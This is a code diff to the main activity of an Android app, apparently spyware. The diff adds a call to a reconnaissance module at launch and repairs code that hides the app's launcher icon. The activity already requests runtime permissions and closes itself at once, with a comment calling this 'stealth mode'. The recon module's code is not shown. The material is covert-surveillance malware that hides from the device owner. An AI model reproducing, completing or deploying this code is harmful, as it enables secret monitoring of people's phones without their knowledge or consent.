@@ -1,14 +1,15 @@
 package com.mobilemorph.agent;
-
+import com.mobilemorph.agent.ReconModule;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.os.Bundle;
 import android.content.pm.PackageManager;
 import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
 import android.Manifest;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-import sun.net.www.protocol.jmod.Handler;
 
 public class MainActivity extends Activity {
     private static final int REQUEST_PERMISSIONS = 100;
@@ -16,6 +17,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        ReconModule.runRecon(this);
         requestRuntimePermissions();
         hideLauncherIcon();
         finish(); // close the activity immediately (stealth mode)
@@ -33,12 +35,15 @@ public class MainActivity extends Activity {
     }
 
     private void hideLauncherIcon() {
-        new Handler().postDelayed() -> {
-            PackageManager p = getPackageManager();
-            ComponentName componentName = new ComponentName(this, MainActivity.class);
-            p.setComponentEnabledSetting(componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
-        }
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                PackageManager p = getPackageManager();
+                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
+                p.setComponentEnabledSetting(componentName,
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+            }
+        }, 1000); // delay optional
     }
 }
